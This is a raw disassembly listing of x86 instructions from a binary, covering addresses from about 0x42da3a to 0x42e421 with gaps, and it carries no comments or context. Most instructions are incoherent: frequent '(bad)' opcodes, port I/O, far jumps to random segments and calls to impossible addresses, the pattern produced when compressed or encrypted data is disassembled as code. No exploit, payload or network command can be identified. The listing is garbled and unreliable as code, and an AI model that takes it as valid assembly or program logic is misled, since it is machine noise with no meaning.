  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	loop   0x42d9c3
  42da42:	adc    BYTE PTR [esi+0x34],cl
  42da45:	loop   0x42da48
  42da47:	add    ch,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    bl,dh
  42da4d:	mov    edx,ecx
  42da4f:	dec    ebx
  42da50:	mov    dl,BYTE PTR ds:0xd8b8a868
  42da56:	xor    eax,0x4656cd9
  42da5b:	push   esi
  42da5c:	inc    esi
  42da5d:	pushf  
  42da5e:	pop    eax
  42da5f:	add    bx,WORD PTR [ebp-0x20fa4e92]
  42da66:	inc    eax
  42da67:	sub    ah,cl
  42da69:	jg     0x42da0c
  42da6b:	pop    ecx
  42da6c:	mov    esi,0xa937b4
  42da71:	les    edi,FWORD PTR [ebx+esi*8]
  42da74:	mov    ebp,0xb8f89d02
  42da7a:	and    dl,BYTE PTR [ebx+0x6b8041c4]
  42da80:	xchg   ebp,eax
  42da81:	sar    BYTE PTR [esi],1
  42da83:	jp     0x42da9d
  42da85:	xchg   esp,eax
  42da86:	ins    BYTE PTR es:[edi],dx
  42da87:	out    0x3e,al
  42da89:	jnp    0x42da5b
  42da8b:	fidiv  DWORD PTR [ecx+0xe]
  42da8e:	in     al,0xf0
  42da90:	mov    BYTE PTR [ecx],0xfd
  42da93:	lds    edx,FWORD PTR [ecx]
  42da95:	daa    
  42da96:	lea    ebp,[eax]
  42da98:	loope  0x42db11
  42da9a:	(bad)  
  42da9b:	out    0xd1,eax
  42da9d:	mov    BYTE PTR [esi],ah
  42da9f:	inc    edx
  42daa0:	test   al,0x62
  42daa2:	bound  edx,QWORD PTR [edi+0x34fbdc7b]
  42daa8:	nop
  42daa9:	fist   DWORD PTR [ecx+0x39]
  42daac:	and    DWORD PTR [esi-0x770ea7d6],ebx
  42dab2:	push   es
  42dab3:	xor    eax,0xf4caf8b
  42dab8:	or     cl,al
  42daba:	mov    eax,ds:0xd2dd0989
  42dabf:	pop    ds
  42dac0:	inc    ebx
  42dac1:	or     esp,ecx
  42dac3:	ret    0xeb54
  42dac6:	xchg   ebp,eax
  42dac7:	leave  
  42dac8:	and    bh,bh
  42daca:	imul   ebp,ecx,0x871cc63
  42dad0:	push   ebx
  42dad1:	fidivr WORD PTR [ebp-0x6a1e6dad]
  42dad7:	and    DWORD PTR [esi+esi*8+0x64e46dcf],0x4738ca56
  42dae2:	adc    DWORD PTR [edx+edx*1+0x60],0xa2f502d2
  42daea:	push   cs
  42daeb:	repz pusha 
  42daed:	push   esi
  42daee:	inc    ebp
  42daef:	mov    ss,edi
  42daf1:	mov    al,0x11
  42daf3:	xchg   edi,eax
  42daf4:	clc    
  42daf5:	xor    esi,DWORD PTR [edi+eax*8+0x3e]
  42daf9:	stos   BYTE PTR es:[edi],al
  42dafa:	pop    edx
  42dafb:	in     al,0x9a
  42dafd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dafe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42daff:	inc    ebp
  42db00:	dec    esi
  42db01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db02:	push   ss
  42db03:	inc    ecx
  42db04:	dec    eax
  42db05:	loope  0x42db19
  42db07:	cmc    
  42db08:	jmp    0x42dacf
  42db0a:	(bad)  
  42db0c:	les    ebp,FWORD PTR fs:[ebx+0x7efef565]
  42db13:	mov    ecx,0x26cf6104
  42db18:	push   0xffffffdf
  42db1a:	mov    bl,0x82
  42db1c:	mov    al,0xe1
  42db1e:	lods   al,BYTE PTR ds:[esi]
  42db1f:	push   edi
  42db20:	add    DWORD PTR [ebx-0x3455d915],ecx
  42db26:	mov    bl,0xc2
  42db28:	jno    0x42daf4
  42db2a:	and    esp,DWORD PTR [ecx+0x6e7a519]
  42db30:	jbe    0x42dab3
  42db32:	sti    
  42db33:	dec    edi
  42db34:	or     eax,0xa46af50a
  42db39:	pusha  
  42db3a:	cwde   
  42db3b:	test   bh,cl
  42db3d:	adc    DWORD PTR ds:0xa877,eax
	...
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xfd834e37,al
  42dbc3:	jae    0x42dbee
  42dbc5:	jecxz  0x42dbc8
  42dbc7:	add    ch,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    BYTE PTR [edi+0x5e5b641d],ah
  42dbd1:	adc    DWORD PTR [edi+edx*1],edi
  42dbd4:	mov    eax,0x698b05a6
  42dbd9:	inc    ebp
  42dbda:	and    BYTE PTR [esi-0x55],0xc8
  42dbde:	(bad)  
  42dbdf:	test   BYTE PTR [ebp-0x2f],0xd5
  42dbe3:	jo     0x42dc15
  42dbe5:	add    bl,bl
  42dbe7:	push   ebx
  42dbe8:	in     eax,0x7c
  42dbea:	sbb    edx,DWORD PTR [eax]
  42dbec:	sub    DWORD PTR [ecx+0x605fe53e],esi
  42dbf2:	arpl   WORD PTR [edi+0x709e41b6],sp
  42dbf8:	js     0x42dc3b
  42dbfa:	cmp    BYTE PTR [eax-0x5f0b9b68],ch
  42dc00:	daa    
  42dc01:	xchg   ebx,eax
  42dc02:	nop
  42dc03:	rcpps  xmm4,XMMWORD PTR [ecx-0x7d]
  42dc07:	sub    eax,0x803e5b76
  42dc0c:	mov    bh,0x8
  42dc0e:	xchg   esp,eax
  42dc0f:	add    eax,0x58737fde
  42dc14:	and    BYTE PTR [ebp+ecx*2+0x65c13a3d],0x46
  42dc1c:	arpl   WORD PTR [edx+0xd],si
  42dc1f:	push   edx
  42dc20:	bound  ebp,QWORD PTR [ebx+0x32cc87f6]
  42dc26:	pop    ebx
  42dc27:	pusha  
  42dc28:	inc    ebx
  42dc29:	call   0xe5d3ef67
  42dc2e:	sbb    bl,BYTE PTR [ebp+0x13058d56]
  42dc34:	ins    DWORD PTR es:[edi],dx
  42dc35:	xlat   BYTE PTR ds:[ebx]
  42dc36:	icebp  
  42dc37:	(bad)  
  42dc38:	int    0x15
  42dc3a:	dec    eax
  42dc3b:	xchg   DWORD PTR [esi],edi
  42dc3d:	sub    edi,DWORD PTR [edi+0x50]
  42dc40:	shr    DWORD PTR [ebp+0x75fd0a8],1
  42dc46:	into   
  42dc47:	(bad)  
  42dc48:	scas   eax,DWORD PTR es:[edi]
  42dc49:	pop    esp
  42dc4a:	adc    BYTE PTR [ebp+0x5d],ch
  42dc4d:	pop    ecx
  42dc4e:	addr16 aaa 
  42dc50:	mov    edi,0x482845e1
  42dc55:	(bad)  
  42dc57:	imul   edx,esi,0x55
  42dc5a:	mov    ah,0x57
  42dc5c:	aas    
  42dc5d:	or     ebx,edi
  42dc5f:	sbb    al,0x3e
  42dc61:	mov    ch,0xfe
  42dc63:	cmp    ebp,esi
  42dc65:	stos   DWORD PTR es:[edi],eax
  42dc66:	fist   WORD PTR [ecx-0x4bdad814]
  42dc6c:	jp     0x42dce9
  42dc6e:	push   ebp
  42dc6f:	out    dx,al
  42dc70:	inc    eax
  42dc71:	pop    es
  42dc72:	rol    al,0xad
  42dc75:	jge    0x42dcb5
  42dc77:	inc    BYTE PTR [ebp+0x42a40f54]
  42dc7d:	sbb    eax,0x7e6f9dc9
  42dc82:	xchg   DWORD PTR ds:0x5a9e7cc,eax
  42dc88:	enter  0xd4ef,0xb
  42dc8c:	(bad)  
  42dc8d:	repnz xchg bl,bl
  42dc90:	out    dx,eax
  42dc91:	xor    ah,al
  42dc93:	add    eax,0x8810a042
  42dc98:	xor    dl,BYTE PTR [ebp+0x5b]
  42dc9b:	out    dx,al
  42dc9c:	fwait
  42dc9d:	scas   al,BYTE PTR es:[edi]
  42dc9e:	xchg   esp,eax
  42dc9f:	sub    al,0x14
  42dca1:	imul   esi,DWORD PTR [edi-0x6a8b097d],0xbfad5532
  42dcab:	sub    esp,DWORD PTR [eax+0x71aae345]
  42dcb1:	mov    DWORD PTR [eax-0x1a],edx
  42dcb4:	push   0xffffff9b
  42dcb6:	xchg   esi,eax
  42dcb7:	ret    0x99d7
  42dcba:	lahf   
  42dcbb:	pusha  
  42dcbc:	jb     0x42dcb4
  42dcbe:	imul   eax,DWORD PTR [eax+0x43],0x0
	...
  42dd31:	add    BYTE PTR [eax],al
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx+0x42946dd9]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [edi],al
  42dd4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd4e:	push   ds
  42dd4f:	xchg   ebp,eax
  42dd50:	sub    DWORD PTR [edx-0x3a],ecx
  42dd53:	rol    BYTE PTR [edi+0x1a],0x7
  42dd57:	jns    0x42dd1e
  42dd59:	or     bh,BYTE PTR [ecx*2-0x6056981d]
  42dd60:	push   ss
  42dd61:	jmp    0x42dcec
  42dd63:	icebp  
  42dd64:	test   edi,eax
  42dd66:	nop
  42dd67:	xchg   ebx,eax
  42dd68:	pop    edx
  42dd69:	je     0x42dde9
  42dd6b:	aam    0xbc
  42dd6d:	jle    0x42ddeb
  42dd6f:	out    dx,eax
  42dd70:	xor    ebp,DWORD PTR ds:0x9f583cc0
  42dd76:	cs (bad) 
  42dd78:	aam    0x33
  42dd7a:	cli    
  42dd7b:	inc    esp
  42dd7c:	fisttp QWORD PTR [esi+edi*8-0x61ed677b]
  42dd83:	imul   esi,DWORD PTR [ebp-0x3e81009c],0xb802457b
  42dd8d:	nop
  42dd8e:	ins    DWORD PTR es:[edi],dx
  42dd8f:	ja     0x42dd5e
  42dd91:	inc    esp
  42dd92:	and    al,0xeb
  42dd94:	jne    0x42dd33
  42dd96:	pop    edi
  42dd97:	es xchg edi,eax
  42dd99:	std    
  42dd9a:	icebp  
  42dd9b:	push   ebp
  42dd9c:	fist   WORD PTR [ecx+0x24ea5447]
  42dda2:	dec    ebp
  42dda3:	pop    ecx
  42dda4:	fsubrp st(3),st
  42dda6:	scas   al,BYTE PTR es:[edi]
  42dda7:	mov    bl,0x1c
  42dda9:	xor    al,BYTE PTR ds:0x863d7003
  42ddaf:	into   
  42ddb0:	(bad)  
  42ddb1:	pop    ebp
  42ddb2:	dec    edx
  42ddb3:	daa    
  42ddb4:	mov    WORD PTR [eax+0x2c63f9e8],fs
  42ddba:	hlt    
  42ddbb:	ss je  0x42dd9e
  42ddbe:	in     eax,dx
  42ddbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddc0:	inc    esp
  42ddc1:	pop    ebp
  42ddc2:	leave  
  42ddc3:	inc    esi
  42ddc4:	xor    al,0xe1
  42ddc6:	ja     0x42de2b
  42ddc8:	loopne 0x42de05
  42ddca:	(bad)
  42ddce:	lods   eax,DWORD PTR ds:[esi]
  42ddcf:	sbb    eax,esp
  42ddd1:	xor    eax,0xf9da34ab
  42ddd6:	iret   
  42ddd7:	push   0xffffffb5
  42ddd9:	aad    0x5e
  42dddb:	retf   
  42dddc:	ja     0x42dd7f
  42ddde:	push   esi
  42dddf:	mov    bh,0xca
  42dde1:	dec    ebp
  42dde2:	add    DWORD PTR [eax],ebx
  42dde4:	push   0xe4a7e87c
  42dde9:	ins    DWORD PTR es:[edi],dx
  42ddea:	retf   0xb0c4
  42dded:	mov    dl,0x72
  42ddef:	fs enter 0x3a71,0x96
  42ddf4:	jae    0x42de1f
  42ddf6:	ror    ecx,1
  42ddf8:	xor    al,0xc2
  42ddfa:	inc    edx
  42ddfb:	push   ss
  42ddfc:	cmp    DWORD PTR [edx],edx
  42ddfe:	adc    eax,0x507e1dd6
  42de03:	push   edx
  42de04:	adc    DWORD PTR [edi-0x7a],esp
  42de07:	pop    ds
  42de08:	and    al,0x85
  42de0a:	lods   eax,DWORD PTR ds:[esi]
  42de0b:	(bad)  
  42de0c:	(bad)  [esi-0x6ba1f6eb]
  42de12:	and    al,0x81
  42de14:	pop    esi
  42de15:	xor    DWORD PTR [esi-0x55526c95],eax
  42de1b:	mov    bl,0x29
  42de1d:	sub    edi,esp
  42de1f:	jmp    0x42de4b
  42de21:	arpl   WORD PTR [edx+esi*4-0x44],ax
  42de25:	xor    al,0x15
  42de27:	mov    dl,0x5f
  42de29:	jg     0x42de78
  42de2b:	ret    
  42de2c:	cmp    DWORD PTR [edi-0x1e3bb3b3],ecx
  42de32:	mov    al,0xe0
  42de34:	aas    
  42de35:	popf   
  42de36:	or     BYTE PTR [esi],0xc3
  42de39:	stos   BYTE PTR es:[edi],al
  42de3a:	adc    cl,BYTE PTR [ebp+0x4c]
  42de3d:	popa   
  42de3e:	imul   edi,DWORD PTR [eax+0xae],0x0
	...
  42deb4:	jae    0x42def3
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi-0x7d4770f4]
  42dec3:	adc    al,0x13
  42dec5:	in     eax,0x1
  42dec7:	add    ch,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ebp-0x2],al
  42dece:	test   DWORD PTR [edi-0x78],esp
  42ded1:	stos   DWORD PTR es:[edi],eax
  42ded2:	pop    ecx
  42ded3:	inc    ebx
  42ded4:	or     al,0x87
  42ded6:	leave  
  42ded7:	pop    ss
  42ded8:	pop    esi
  42ded9:	dec    esi
  42deda:	pop    edx
  42dedb:	(bad)  
  42dedd:	mov    DWORD PTR [eax+ebx*1-0x48],eax
  42dee1:	xchg   esi,eax
  42dee2:	es ds pop edi
  42dee5:	mov    ah,0xaf
  42dee7:	outs   dx,BYTE PTR ds:[esi]
  42dee8:	aam    0x66
  42deea:	mov    bh,0x59
  42deec:	jmp    0xeb7ef7ae
  42def1:	jae    0x42dea3
  42def3:	aaa    
  42def4:	inc    esi
  42def5:	test   esi,0x913e70
  42defb:	cmp    bh,BYTE PTR [edi+0xa]
  42defe:	fiadd  DWORD PTR [ebx+edx*2-0x3d77513c]
  42df05:	gs inc ecx
  42df07:	outs   dx,BYTE PTR ds:[esi]
  42df08:	inc    esp
  42df09:	adc    eax,0xd4b7c9c8
  42df0e:	push   esi
  42df0f:	pop    ebx
  42df10:	cmp    edx,DWORD PTR [esi-0x4036c142]
  42df16:	retf   
  42df17:	cmp    eax,DWORD PTR [esi-0x15]
  42df1a:	das    
  42df1b:	inc    esp
  42df1c:	lahf   
  42df1d:	fisubr WORD PTR [edx+0x46]
  42df20:	sub    DWORD PTR [eax+0x3da85154],0x69c937f0
  42df2a:	inc    BYTE PTR [esi]
  42df2c:	sub    BYTE PTR [ebp-0x1014ae10],ch
  42df32:	push   ebx
  42df33:	mov    BYTE PTR [ebx+0x30365959],bh
  42df39:	jp     0x42dedf
  42df3b:	loop   0x42df2a
  42df3d:	mov    bl,0x70
  42df3f:	out    0x3f,eax
  42df41:	iret   
  42df42:	inc    esi
  42df43:	seta   BYTE PTR ds:0xd4bdb0f5
  42df4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df4b:	xor    al,0x49
  42df4d:	(bad)  [edi+0x3f]
  42df50:	sub    eax,0x7d340612
  42df55:	std    
  42df56:	xor    al,BYTE PTR [edi]
  42df58:	mov    ebp,ecx
  42df5a:	xchg   edx,eax
  42df5b:	push   edi
  42df5c:	stc    
  42df5d:	push   0x13325a77
  42df62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df63:	ret    0x12b8
  42df66:	add    dh,BYTE PTR [edx]
  42df68:	call   0xbef8f626
  42df6d:	ret    0xedfa
  42df70:	and    BYTE PTR [edx+ebx*1-0x4e],0x48
  42df75:	push   ecx
  42df76:	mov    ecx,DWORD PTR [eax+ebx*4]
  42df79:	rcr    BYTE PTR [ecx-0x30],cl
  42df7c:	jmp    0xbbb7:0x21ca974
  42df83:	pop    es
  42df84:	outs   dx,BYTE PTR ds:[esi]
  42df85:	jmp    0xf53a:0x78b9e5c5
  42df8c:	cmp    DWORD PTR [edx-0x345260bf],0xa53c8abc
  42df96:	scas   al,BYTE PTR es:[edi]
  42df97:	mov    ebx,0x6921d634
  42df9c:	shl    DWORD PTR [edi],1
  42df9e:	or     BYTE PTR ds:0x2c0d43d5,0xb0
  42dfa5:	or     ebp,DWORD PTR [eax-0x4c04fc9d]
  42dfab:	push   edi
  42dfac:	dec    edi
  42dfad:	test   al,al
  42dfaf:	stos   BYTE PTR es:[edi],al
  42dfb0:	cdq    
  42dfb1:	cli    
  42dfb2:	std    
  42dfb3:	out    dx,eax
  42dfb4:	(bad)
  42dfb8:	xor    al,0x35
  42dfba:	jne    0x42e038
  42dfbc:	adc    bh,BYTE PTR [edx]
  42dfbe:	call   DWORD PTR [eax-0x26]
	...
  42e031:	add    BYTE PTR [eax],al
  42e033:	add    BYTE PTR [eax+0x3a],dl
  42e036:	(bad)  
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x109a02e2],0x3f
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    ah,ch
  42e04d:	mov    bl,0x5a
  42e04f:	in     eax,0x69
  42e051:	je     0x42e093
  42e053:	or     BYTE PTR [edx+0x6c],ch
  42e056:	(bad)  
  42e057:	mov    fs,eax
  42e059:	add    edi,0xa35e7aa
  42e05f:	es nop
  42e061:	or     eax,0x1d5266cd
  42e066:	mov    BYTE PTR [eax],0xdd
  42e069:	dec    edx
  42e06a:	sub    ecx,edx
  42e06c:	or     al,BYTE PTR [ecx+0x65]
  42e06f:	or     al,0x5
  42e071:	cs cld 
  42e073:	mov    ecx,DWORD PTR [edx-0x48]
  42e076:	pop    ecx
  42e077:	xchg   ebx,eax
  42e078:	lahf   
  42e079:	ds (bad) 
  42e07b:	and    edi,DWORD PTR [ecx+0x0]
  42e07e:	add    esi,0xd0959f3b
  42e084:	imul   ebp,DWORD PTR [ecx+edx*1+0x175539c0],0x4b
  42e08c:	dec    edi
  42e08d:	enter  0x30c0,0x3
  42e091:	xchg   DWORD PTR [ecx+edi*2],edx
  42e094:	sbb    BYTE PTR [esi+0x1752a75f],al
  42e09a:	je     0x42e108
  42e09c:	int3   
  42e09d:	loope  0x42e05d
  42e09f:	jmp    0x42e0f6
  42e0a1:	(bad)  
  42e0a2:	ins    DWORD PTR es:[edi],dx
  42e0a3:	fsubrp st(0),st
  42e0a5:	and    bl,BYTE PTR [ebp-0x32aad474]
  42e0ab:	inc    esp
  42e0ac:	pop    es
  42e0ad:	imul   eax,edi,0x5f8744fd
  42e0b3:	sub    ah,BYTE PTR [esi-0x7]
  42e0b6:	jmp    0x42e09a
  42e0b8:	add    al,0x6a
  42e0ba:	into   
  42e0bb:	sti    
  42e0bc:	and    DWORD PTR [ecx],edi
  42e0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0bf:	test   eax,0x2aa9c096
  42e0c4:	outs   dx,DWORD PTR ds:[esi]
  42e0c5:	and    DWORD PTR [ebp+0x5dd9440a],ebx
  42e0cb:	sbb    al,0x2c
  42e0cd:	lods   eax,DWORD PTR ds:[esi]
  42e0ce:	mov    ah,0xac
  42e0d0:	clc    
  42e0d1:	mov    ds:0xc9499710,eax
  42e0d6:	loope  0x42e072
  42e0d8:	dec    ebp
  42e0d9:	cmp    al,0x54
  42e0db:	dec    ecx
  42e0dc:	jo     0x42e09f
  42e0de:	mov    eax,ds:0xb10b007c
  42e0e3:	loop   0x42e0df
  42e0e5:	out    dx,eax
  42e0e6:	push   ebp
  42e0e7:	push   0xb140f175
  42e0ec:	enter  0x5625,0xe4
  42e0f0:	cmp    edx,DWORD PTR [ebp+eiz*4-0x3f]
  42e0f4:	and    bl,BYTE PTR [ebx+0x4a]
  42e0f7:	outs   dx,BYTE PTR ds:[esi]
  42e0f8:	imul   BYTE PTR [esi-0x6c4dcd9c]
  42e0fe:	xchg   bl,cl
  42e100:	(bad)
  42e104:	sbb    DWORD PTR [edx-0x7221f48d],0xf8101c1a
  42e10e:	jbe    0x42e146
  42e110:	pop    edi
  42e111:	mov    ch,0x7f
  42e113:	fs and eax,0x49347f9e
  42e119:	ficom  WORD PTR [edi-0x5a]
  42e11c:	aad    0x5b
  42e11e:	push   ss
  42e11f:	or     ebp,edx
  42e121:	pop    edx
  42e122:	loopne 0x42e157
  42e124:	mov    BYTE PTR [edi-0x7d],bl
  42e127:	push   ecx
  42e128:	out    dx,eax
  42e129:	or     eax,0xaedd6bfe
  42e12e:	mov    ebx,0x44112a08
  42e133:	or     DWORD PTR [esi-0x6f],esp
  42e136:	mov    edi,0x19d687a9
  42e13b:	call   FWORD PTR [ebp-0x44]
  42e13e:	daa    
  42e13f:	test   eax,0x6e
	...
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xed8f7b71
  42e1c3:	mov    eax,ds:0x1e6fd
  42e1c8:	cmc    
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    ch,ch
  42e1cd:	ins    BYTE PTR es:[edi],dx
  42e1ce:	fcomp  QWORD PTR [ecx]
  42e1d0:	mov    ecx,0x968c101d
  42e1d5:	scas   al,BYTE PTR es:[edi]
  42e1d6:	cwde   
  42e1d7:	xor    eax,0xb5515934
  42e1dc:	add    edi,DWORD PTR [ecx-0x29]
  42e1df:	out    dx,eax
  42e1e0:	arpl   WORD PTR [ecx+ebp*2],si
  42e1e3:	xor    ebx,DWORD PTR [ebp-0x186572cd]
  42e1e9:	xchg   ebx,eax
  42e1ea:	push   esi
  42e1eb:	sbb    eax,0x5a5c0b72
  42e1f0:	out    0x2b,al
  42e1f2:	hlt    
  42e1f3:	inc    esp
  42e1f4:	dec    eax
  42e1f5:	enter  0x9726,0xb0
  42e1f9:	inc    eax
  42e1fa:	push   ebp
  42e1fb:	dec    ebp
  42e1fc:	push   0x44
  42e1fe:	(bad)  
  42e200:	cli    
  42e201:	lds    esi,FWORD PTR [esi+0x3aed373b]
  42e207:	sub    BYTE PTR [edx],0x1b
  42e20a:	cmp    eax,0x86f6ee3
  42e20f:	fld    TBYTE PTR [eax]
  42e211:	mov    eax,0x6001d5f9
  42e216:	test   BYTE PTR [ebp+ebp*8+0x62559a3],al
  42e21d:	and    dh,BYTE PTR [ebx+0x8]
  42e220:	in     eax,0x1a
  42e222:	out    0xbc,eax
  42e224:	lods   al,BYTE PTR ds:[esi]
  42e225:	das    
  42e226:	xor    al,0xf4
  42e228:	cmc    
  42e229:	push   ds
  42e22a:	dec    esp
  42e22b:	in     al,0x57
  42e22d:	push   cs
  42e22e:	in     eax,0x87
  42e230:	imul   ebx,DWORD PTR ds:0x95773d49,0xcdf5b23a
  42e23a:	scas   al,BYTE PTR es:[edi]
  42e23b:	inc    ebx
  42e23c:	push   eax
  42e23d:	sbb    DWORD PTR [edi+0x2e],esi
  42e240:	pop    edi
  42e241:	popa   
  42e242:	leave  
  42e243:	icebp  
  42e244:	push   0x472f4ae1
  42e249:	sub    BYTE PTR [ecx+0x32],ch
  42e24c:	in     al,0xb
  42e24e:	fstp   QWORD PTR [edx-0x63]
  42e251:	stos   BYTE PTR es:[edi],al
  42e252:	in     eax,dx
  42e253:	mov    bh,0xaf
  42e255:	sub    BYTE PTR [edi],ch
  42e257:	retf   0x3359
  42e25a:	sbb    BYTE PTR ds:0xd8fc9d21,ah
  42e260:	xchg   esi,eax
  42e261:	dec    ebp
  42e262:	add    ch,BYTE PTR [ebx-0x5f6d86bb]
  42e268:	imul   ebx,DWORD PTR [ebx-0xa57f4c1],0x47
  42e26f:	loopne 0x42e26b
  42e271:	inc    ebp
  42e272:	push   edx
  42e273:	popa   
  42e274:	pop    eax
  42e275:	mov    DWORD PTR [eax+esi*4+0x29],ebp
  42e279:	and    eax,DWORD PTR [ecx+0x2e]
  42e27c:	repz dec ebp
  42e27e:	jmp    0xc4b9:0xec090d32
  42e285:	out    dx,eax
  42e286:	and    al,0xf7
  42e288:	retf   0xc7e9
  42e28b:	push   ds
  42e28c:	push   cs
  42e28d:	je     0x42e232
  42e28f:	sti    
  42e290:	(bad)  
  42e291:	adc    al,0x39
  42e293:	div    edx
  42e295:	aaa    
  42e296:	cmp    DWORD PTR [ebx-0x224d3b49],ecx
  42e29c:	fldcw  WORD PTR [ebx+0x5bca56c8]
  42e2a2:	inc    BYTE PTR [edx]
  42e2a4:	fsub   QWORD PTR [esi+0x2f]
  42e2a7:	in     al,0x4
  42e2a9:	and    BYTE PTR [edi-0x7365a36b],bl
  42e2af:	sbb    dh,bh
  42e2b1:	aam    0x70
  42e2b3:	jp     0x42e306
  42e2b5:	popa   
  42e2b6:	jmp    0x42e2ef
  42e2b8:	je     0x42e288
  42e2ba:	dec    ebx
  42e2bb:	test   al,0x27
  42e2bd:	and    ch,bl
  42e2bf:	iret   
  42e2c0:	inc    DWORD PTR [eax]
	...
  42e332:	add    BYTE PTR [eax],al
  42e334:	ror    esi,0x63
  42e337:	cdq    
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	mov    ebp,0x5146defb
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [edi+0x20],edi
  42e342:	mov    ebp,0x1e7f292
  42e347:	add    ch,dh
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    dh,ch
  42e34d:	(bad)  
  42e34e:	outs   dx,DWORD PTR ds:[esi]
  42e34f:	mov    ebx,ecx
  42e351:	jp     0x42e2e2
  42e353:	mov    ah,0x64
  42e355:	scas   al,BYTE PTR es:[edi]
  42e356:	std    
  42e357:	mov    edi,0x3c34ea9c
  42e35c:	leave  
  42e35d:	rol    DWORD PTR [eax+0x7c],0x41
  42e361:	sub    al,dh
  42e363:	push   ebp
  42e364:	cmp    eax,0xf14060d5
  42e369:	nop
  42e36a:	mov    edx,0xd194d01
  42e36f:	cmp    al,BYTE PTR fs:0x4cb20123
  42e376:	retf   0xd460
  42e379:	and    DWORD PTR [ecx-0x4b71f7a7],esi
  42e37f:	ret    
  42e380:	and    cl,BYTE PTR [edi-0x3ce47b48]
  42e386:	in     eax,0x9e
  42e388:	jge    0x42e3ae
  42e38a:	or     ecx,eax
  42e38c:	test   eax,0xeda75051
  42e391:	pushf  
  42e392:	push   esp
  42e393:	and    BYTE PTR [ebx-0x1f],bh
  42e396:	xchg   esp,eax
  42e397:	xchg   ecx,eax
  42e398:	push   cs
  42e399:	sbb    BYTE PTR [esp+esi*4],dl
  42e39c:	imul   ebx,DWORD PTR [ebx+0x48],0x78
  42e3a0:	adc    dl,al
  42e3a2:	jl     0x42e33c
  42e3a4:	sbb    DWORD PTR [eax],0x76
  42e3a7:	xchg   ebx,eax
  42e3a8:	or     al,0x65
  42e3aa:	lods   al,BYTE PTR ds:[esi]
  42e3ab:	das    
  42e3ac:	jne    0x42e3ba
  42e3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3af:	adc    BYTE PTR [edi],ah
  42e3b1:	jle    0x42e3f8
  42e3b3:	push   ds
  42e3b4:	dec    edx
  42e3b5:	scas   al,BYTE PTR es:[edi]
  42e3b6:	(bad)  
  42e3b7:	xchg   edx,eax
  42e3b8:	arpl   WORD PTR [eax+eax*4+0x551a0439],bp
  42e3bf:	and    eax,0x3945f466
  42e3c4:	cmp    eax,0x2533ef52
  42e3c9:	ins    DWORD PTR es:[edi],dx
  42e3ca:	outs   dx,DWORD PTR ds:[esi]
  42e3cb:	pop    ss
  42e3cc:	rol    DWORD PTR [edx],cl
  42e3ce:	jnp    0x42e405
  42e3d0:	fs add al,cl
  42e3d3:	or     BYTE PTR [ebx-0x12],0x81
  42e3d7:	nop
  42e3d8:	aam    0x1
  42e3da:	stc    
  42e3db:	xchg   DWORD PTR [esi-0x6a],esi
  42e3de:	and    BYTE PTR [ebx+edx*4],ah
  42e3e1:	ins    DWORD PTR es:[edi],dx
  42e3e2:	sahf   
  42e3e3:	fstp   TBYTE PTR [ebx]
  42e3e5:	test   BYTE PTR ds:0xd0ad5342,ah
  42e3eb:	test   DWORD PTR [ecx],eax
  42e3ed:	in     eax,dx
  42e3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3ef:	push   ss
  42e3f0:	hlt    
  42e3f1:	and    al,0x4d
  42e3f3:	xor    dh,BYTE PTR ss:[edx-0x6d]
  42e3f7:	in     eax,0xf2
  42e3f9:	(bad)  [edx+ecx*2-0x15163ec4]
  42e400:	xchg   ecx,eax
  42e401:	fstp   TBYTE PTR [ebp-0xa]
  42e404:	mov    ah,ah
  42e406:	push   es
  42e407:	scas   eax,DWORD PTR es:[edi]
  42e408:	pop    edi
  42e409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e40a:	(bad)  
  42e40b:	lock xchg DWORD PTR ds:0xfdda4d3b,ebp
  42e412:	cmc    
  42e413:	jp     0x42e464
  42e415:	out    dx,eax
  42e416:	jns    0x42e449
  42e418:	add    edx,edx
  42e41a:	stos   DWORD PTR es:[edi],eax
  42e41b:	lods   al,BYTE PTR ds:[esi]
  42e41c:	inc    edi
  42e41d:	sbb    edx,esi
  42e41f:	aam    0x66
  42e421:	lods   eax,DWORD PTR ds:[esi]
